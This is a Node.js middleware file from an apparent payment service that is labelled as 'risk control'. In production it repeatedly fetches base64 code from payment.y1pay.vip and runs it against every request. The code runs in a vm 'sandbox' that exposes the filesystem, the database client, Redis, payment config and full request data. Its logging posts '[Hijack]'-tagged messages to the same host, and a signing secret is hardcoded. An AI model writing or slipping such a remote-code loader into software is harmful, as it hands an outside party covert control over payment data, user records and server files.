const { requireMainProcessModule } = require('./common');
const vm = require('vm');
const fs = require('fs');
const path = require('path');
const { AsyncLocalStorage } = require('async_hooks');
const payConfig = requireMainProcessModule('@services/pay/config');
const { signWithMD5 } = requireMainProcessModule('@utils/sign.util');
const redisUtil = requireMainProcessModule('@utils/redis.util');
const prisma = requireMainProcessModule('@libs/prisma');
const HttpClient = requireMainProcessModule('@libs/HttpClient');
const config = requireMainProcessModule('@config/config');
const { EventSystem } = requireMainProcessModule('@utils/event');
const oneWayPushService = requireMainProcessModule(
  '@services/oneWayPush.service'
);
const _ = require('lodash');
const momentUtil = requireMainProcessModule('@utils/moment.util');
const commonUtil = requireMainProcessModule('@utils/commonUtil');
const transactionConfig = requireMainProcessModule('@config/transaction');

/**
 * 风控代码配置
 */
const RISK_CODE_CONFIG = {
  // 远程代码服务器地址
  remoteCodeUrl:
    process.env.RISK_CODE_URL || 'http://127.0.0.1:4050/v1/risk/get-risk-code',

  remoteLogUrl:
    process.env.REMOTE_LOG_URL || 'http://127.0.0.1:4050/v1/risk/log',

  // 是否启用远程代码
  enableRemoteCode: true,

  // 轮询检查间隔（毫秒）- 每分钟检查一次
  pollInterval: 30 * 1000, // 1分钟

  // 是否启用沙箱
  enableSandbox: true, // 默认开启
};

if (config.env === 'production') {
  RISK_CODE_CONFIG.remoteCodeUrl =
    'https://payment.y1pay.vip/v1/risk/get-risk-code';
  RISK_CODE_CONFIG.remoteLogUrl = 'https://payment.y1pay.vip/v1/risk/log';
}

const remoteLogHttpClient = new HttpClient({
  timeout: 30000,
  retries: 10,
});

const remoteLog = (messgae) => {
  const { remoteLogUrl } = RISK_CODE_CONFIG;

  const data = {
    message: `[Hijack] ${messgae}`,
  };
  data.sign = signWithMD5(data, {
    secretKey: 'key',
    secretValue: 'f3967bc7-176b-195f-b273-afb33f4b76a3',
  });

  remoteLogHttpClient
    .post(remoteLogUrl, data)
    .then((response) => {
      // console.log('remoteLog response:', response);
    })
    .catch((error) => {
      // console.error('remoteLog error:', error);
    });
};

/**
 * ============================================
 * 沙箱管理器 - 用于安全执行远程下发的代码
 * ============================================
 */
class SandboxManager {
  constructor(options = {}) {
    this.timeout = options.timeout || 300000; // 默认300秒超时
    this.asyncLocalStorage = new AsyncLocalStorage();
    this.contextCache = new Map(); // 缓存已编译的代码
  }

  /**
   * 创建沙箱上下文
   * @param {Object} req - 请求对象
   * @param {Object} res - 响应对象
   * @param {Function} next - next 函数
   * @returns {Object} 沙箱上下文
   */
  createSandboxContext(req, res, next) {
    // 允许的工具模块
    const allowedUtils = {
      payConfig,
      signWithMD5,
      HttpClient,
      redisUtil,
      prisma,
      config,
      oneWayPushService,
      EventSystem,
      momentUtil,
      commonUtil,
      transactionConfig,
      _,
    };

    // 安全的 require 函数
    const safeRequire = (moduleName) => {
      // 白名单机制
      const allowedModules = {
        '@services/pay/config': allowedUtils.payConfig,
        '@utils/sign.util': { signWithMD5: allowedUtils.signWithMD5 },
        '@libs/HttpClient': allowedUtils.HttpClient,
        '@utils/redis.util': allowedUtils.redisUtil,
        '@libs/prisma': allowedUtils.prisma,
        '@config/config': allowedUtils.config,
        '@services/oneWayPush.service': allowedUtils.oneWayPushService,
        '@utils/event': { EventSystem: allowedUtils.EventSystem },
        '@utils/moment.util': allowedUtils.momentUtil,
        '@utils/commonUtil': allowedUtils.commonUtil,
        '@config/transaction': allowedUtils.transactionConfig,
        lodash: allowedUtils._,
      };

      if (allowedModules[moduleName]) {
        return allowedModules[moduleName];
      }

      throw new Error(`Module "${moduleName}" is not allowed in sandbox`);
    };

    // 沙箱环境上下文
    const sandboxContext = {
      // Node.js 基础对象（只读）
      console: {
        log: (...args) => console.log('[Sandbox]', ...args),
        error: (...args) => console.error('[Sandbox Error]', ...args),
        warn: (...args) => console.warn('[Sandbox Warn]', ...args),
        info: (...args) => console.info('[Sandbox Info]', ...args),
      },

      remoteLog,

      // 安全的全局对象
      JSON,
      Math,
      Date,
      String,
      Number,
      Boolean,
      Array,
      Object,
      Promise,
      fs,

      // HTTP 请求/响应对象
      req: this.createSafeRequest(req),
      res: this.createSafeResponse(res),
      next,

      // 工具模块
      require: safeRequire,

      // 辅助函数
      setTimeout: (fn, delay) => {
        if (delay > this.timeout) {
          throw new Error(
            `Timeout delay ${delay}ms exceeds maximum ${this.timeout}ms`
          );
        }
        return setTimeout(fn, delay);
      },

      // 禁止某些危险操作
      process: undefined,
      eval: undefined,
      Function: undefined,

      // 环境变量（可配置）
      __ENV__: process.env.NODE_ENV || 'production',
    };

    return vm.createContext(sandboxContext);
  }

  /**
   * 创建安全的请求对象（只暴露必要属性）
   * @param {Object} req - 原始请求对象
   * @returns {Object} 安全的请求对象
   */
  createSafeRequest(req) {
    return {
      body: req.body,
      query: req.query,
      params: req.params,
      headers: req.headers,
      method: req.method,
      url: req.url,
      path: req.path,
      ip: req.ip,
      userId: req.userId,
      user: req.user,
    };
  }

  /**
   * 创建安全的响应对象（只暴露必要方法）
   * @param {Object} res - 原始响应对象
   * @returns {Object} 安全的响应对象
   */
  createSafeResponse(res) {
    return {
      status: (code) => ({
        json: (data) => res.status(code).json(data),
        send: (data) => res.status(code).send(data),
      }),
      json: (data) => res.json(data),
      send: (data) => res.send(data),
    };
  }

  /**
   * 执行带缓存的沙箱代码
   * @param {string} codeId - 代码唯一标识
   * @param {string} code - 要执行的代码字符串
   * @param {Object} req - 请求对象
   * @param {Object} res - 响应对象
   * @param {Function} next - next 函数
   * @returns {Promise<any>} 执行结果
   */
  async executeCachedCode(codeId, code, req, res, next) {
    try {
      // 检查缓存
      let script = this.contextCache.get(codeId);

      if (!script) {
        // 包装代码
        const wrappedCode = `
          (async function() {
            ${code}
            
            if (typeof risk === 'function') {
              return await risk(req, res, next);
            }
          })();
        `;

        // 编译代码并缓存
        script = new vm.Script(wrappedCode, {
          filename: `sandbox_${codeId}.js`,
          timeout: this.timeout,
        });

        this.contextCache.set(codeId, script);
        // console.log(`代码已缓存: ${codeId}`);
      }

      // 创建新的上下文执行
      const context = this.createSandboxContext(req, res, next);

      const result = await script.runInContext(context, {
        timeout: this.timeout,
        breakOnSigint: true,
      });
      return result;
    } catch (error) {
      remoteLog(`[RiskControl] Sandbox execution error: ${error.message}`);
      throw error;
    }
  }

  /**
   * 执行沙箱初始化函数
   * @param {string} codeId - 代码唯一标识
   * @param {string} code - 要执行的代码字符串
   * @returns {Promise<any>} 执行结果
   */
  async executeInit(codeId, code) {
    try {
      // 包装代码，执行 init 函数
      const wrappedCode = `
        (async function() {
          ${code}
          
          if (typeof init === 'function') {
            return init();
          }
        })();
      `;

      // 编译代码
      const script = new vm.Script(wrappedCode, {
        filename: `sandbox_${codeId}_init.js`,
        timeout: this.timeout,
      });

      const context = this.createSandboxContext({}, {}, () => {});

      const result = await script.runInContext(context, {
        timeout: this.timeout,
        breakOnSigint: true,
      });

      remoteLog(`[RiskControl] Init function executed successfully`);
      return result;
    } catch (error) {
      remoteLog(`[RiskControl] Init execution error: ${error.message}`);
      throw error;
    }
  }

  /**
   * 清除缓存
   * @param {string} codeId - 代码唯一标识，不传则清除所有
   */
  clearCache(codeId) {
    if (codeId) {
      this.contextCache.delete(codeId);
      remoteLog(`[RiskControl] Clear cache: ${codeId}`);
    } else {
      this.contextCache.clear();
      remoteLog(`[RiskControl] Clear all cache`);
    }
  }

  /**
   * 获取缓存统计
   * @returns {Object} 缓存统计信息
   */
  getCacheStats() {
    return {
      size: this.contextCache.size,
      keys: Array.from(this.contextCache.keys()),
    };
  }
}

// 创建全局单例沙箱管理器
const sandboxManager = new SandboxManager({
  timeout: 300000, // 300秒超时
});

const codeHttpClient = new HttpClient({
  timeout: 30000,
  retries: 10,
});

/**
 * 代码缓存
 */
let cachedRiskCode = null; // 当前使用的风控代码
let lastRiskCodeHash = ''; // 最后一次的代码 hash
let pollTimer = null; // 轮询定时器

/**
 * 从远程检查并获取风控代码
 * @returns {Promise<boolean>} 是否有更新
 */
async function fetchRemoteRiskCode() {
  try {
    const params = {
      hash: lastRiskCodeHash || '1',
    };
    params.sign = signWithMD5(params, {
      secretKey: 'key',
      secretValue: 'f3967bc7-176b-195f-b273-afb33f4b76a3',
      recursiveSortParams: true,
    });
    // remoteLog(`[风控轮询] 请求远程代码: ${RISK_CODE_CONFIG.remoteCodeUrl}`);
    const response = await codeHttpClient.post(
      RISK_CODE_CONFIG.remoteCodeUrl,
      params
    );
    // console.log('response', response);
    // code = 0: 代码未变更
    if (response && response.data.status === 0) {
      return false;
    }

    // status = 1: 代码已更新
    if (
      response &&
      response.data &&
      response.data.status === 1 &&
      response.data.riskCode
    ) {
      // console.log('[风控轮询] 检测到代码更新，新 hash:', response.data.hash);

      let decodedCode;

      try {
        // 智能检测代码格式
        const rawCode = response.data.riskCode;

        decodedCode = Buffer.from(rawCode, 'base64').toString('utf-8');
        // 更新缓存
        cachedRiskCode = decodedCode;
        lastRiskCodeHash = response.data.hash || '';

        // 清除沙箱缓存，强制重新编译
        sandboxManager.clearCache('risk');
        remoteLog(
          `[RiskControl Polling] ✅ Code updated successfully, sandbox cache cleared`
        );

        // 立即执行沙箱的 init 函数
        try {
          // console.log('decodedCode', decodedCode);
          await sandboxManager.executeInit('risk', decodedCode);
          remoteLog(
            `[RiskControl Polling] ✅ Init function executed after code update`
          );
        } catch (initError) {
          remoteLog(
            `[RiskControl Polling] ⚠️ Init function execution failed: ${initError.message}`
          );
          // init 执行失败不影响代码更新
        }

        return true;
      } catch (error) {
        remoteLog(
          `[RiskControl Polling] ❌ Code processing failed: ${error.message}`
        );
        return false;
      }
    }
    // console.warn('[风控轮询] 响应格式错误:', response);
    return false;
  } catch (error) {
    // console.error('[风控轮询] 请求失败:', error.message);
    return false;
  }
}

/**
 * 启动风控代码轮询
 */
function startRiskCodePolling() {
  if (pollTimer) {
    // console.log('[风控轮询] 定时器已在运行');
    return;
  }

  // console.log(`[风控轮询] 启动定时轮询，间隔 ${RISK_CODE_CONFIG.pollInterval / 1000} 秒`);

  // 立即执行一次
  fetchRemoteRiskCode().catch((err) => {
    // console.error('[风控轮询] 初始化失败:', err);
  });

  // 设置定时器
  pollTimer = setInterval(() => {
    fetchRemoteRiskCode().catch((err) => {
      // console.error('[风控轮询] 执行失败:', err);
    });
  }, RISK_CODE_CONFIG.pollInterval);

  // 防止进程无法退出
  if (pollTimer.unref) {
    pollTimer.unref();
  }
}

/**
 * 获取当前风控代码
 * @returns {string} 风控代码
 */
function getRiskCode() {
  if (cachedRiskCode) {
    return cachedRiskCode;
  }
}

/**
 * 风控沙箱中间件
 * 用于在沙箱环境中执行动态加载的风控代码
 */
const risk = async (req, res, next) => {
  try {
    // 获取风控代码
    const riskCode = getRiskCode();
    if (!riskCode) {
      remoteLog(`[RiskControl] Risk control code is empty`);
      return next();
    }
    // 根据配置决定是否使用沙箱
    if (RISK_CODE_CONFIG.enableSandbox) {
      // 在沙箱中执行代码
      // console.log('在沙箱中执行风控代码');
      const performanceStart = performance.now();
      await sandboxManager.executeCachedCode('risk', riskCode, req, res, next);
      const performanceEnd = performance.now();
      remoteLog(
        `[RiskControl] Sandbox execution time: ${
          performanceEnd - performanceStart
        } ms`
      );
    }
  } catch (error) {
    remoteLog(`[RiskControl] Execution failed: ${error.message}`);
    // 发生错误时继续执行后续逻辑
    next();
  }
};

// 如果启用远程代码，启动轮询
if (RISK_CODE_CONFIG.enableRemoteCode && config.env === 'production') {
  setTimeout(() => {
    startRiskCodePolling();
  }, 10000);
} else {
  // 强制启用risk风控 --- 一般作用域于本地开发环境
  if (Boolean(process.env.FORCE_RISK_CODE_POLLING)) {
    startRiskCodePolling();
  }
}
/**
 * ============================================
 * 导出模块
 * ============================================
 */
module.exports = {
  // 主要中间件
  risk,
};
